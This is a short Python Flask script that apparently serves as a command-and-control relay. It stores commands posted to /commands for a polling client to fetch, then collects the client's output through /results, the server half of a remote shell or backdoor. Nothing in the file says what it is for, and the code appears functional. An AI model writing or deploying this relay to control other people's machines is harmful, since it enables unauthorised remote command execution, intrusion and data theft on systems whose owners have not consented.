from flask import Flask, request
import socket

app = Flask(__name__)
command = None
result = None

@app.route("/commands", methods=["GET"])
def listen_commands():
    if command:
        return command
    else:
        return ""

@app.route("/commands", methods=["POST"])
def send_commands():
    global command
    cmd = request.data.decode("utf-8")
    try:
        command = cmd
        return "OK"
    except Exception as e:
        return "ERROR: " + str(e)

@app.route("/results", methods=["GET"])
def listen_results():
    global result
    if result:
        res = result
        result = None
        return res
    else:
        return ""
    

@app.route("/results", methods=["POST"])
def send_results():
    global result, command
    res = request.data.decode("utf-8")
    try:
        result = res
        command = None
        return ""
    except Exception as e:
        return "ERROR: " + str(e)


if __name__ == "__main__":
    ip = socket.gethostbyname(socket.gethostname())
    app.run(host=ip, port=8080)